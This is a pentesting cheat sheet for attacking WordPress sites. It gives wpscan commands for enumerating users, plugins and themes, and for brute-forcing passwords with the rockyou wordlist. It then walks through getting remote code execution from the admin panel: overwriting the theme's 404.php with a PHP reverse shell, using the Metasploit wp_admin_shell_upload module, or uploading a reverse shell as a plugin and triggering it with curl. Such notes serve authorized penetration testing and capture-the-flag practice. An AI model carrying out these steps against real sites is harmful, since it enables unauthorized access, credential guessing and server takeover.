# Wordpress

### 1) Scan Wordpress for general information

    wpscan --url http://domain.local/wordpress

### 2) Enumerate users

    wpscan --url http://domain.local/wordpress --enumerate u

### 3) Enumerate all plugins

    wpscan --url http://domain.local/wordpress --plugins-detection aggressive

### 4) Password Attack

    wpscan --url http://domain.local/wordpress --usernames USER --passwords /usr/share/wordlist/rockyou.txt

### 5) Enumerate themes

    wpscan --url http://domain.local/wordpress --enumerate t

## Admin panel RCE (Requires credentials)

### 1) Edit 404.php on Wordpress Theme Editor

Go to:

    Themes -> Editor

Choose the 404.php file and replace it with a PHP reverse shell.

Trigger the 404 file to run your shell

    curl http://domain.local/wp-content/themes/twentyfifteen/404.php

Theme can be different

### Alternate method: Metasploit

    use exploit/unix/webapp/wp_admin_shell_upload

Enter appropriate information, then run.

### 2) Malicious Plugin Installation

Go to:

    Plugins -> Editor

Compress your PHP reverse shell as a .zip file

    zip shell.zip php-reverse-shell.php

Upload the .zip plugin

On plugin menu, click activate the newly installed plugin to execute and get a shell

OR 

Go to uploads directory and get your reverse shell

    curl http://domain.local/wp-content/uploads/php-reverse-shell.php

### Alternate Method

Go to:

    Plugins -> Add New

Select install/upload and use your PHP reverse shell

If it asks you for FTP credentials and has FTP enabled, insert credentials and 127.0.0.1 hostname

Go to media -> select our file -> Go to the presented URL that the file resides
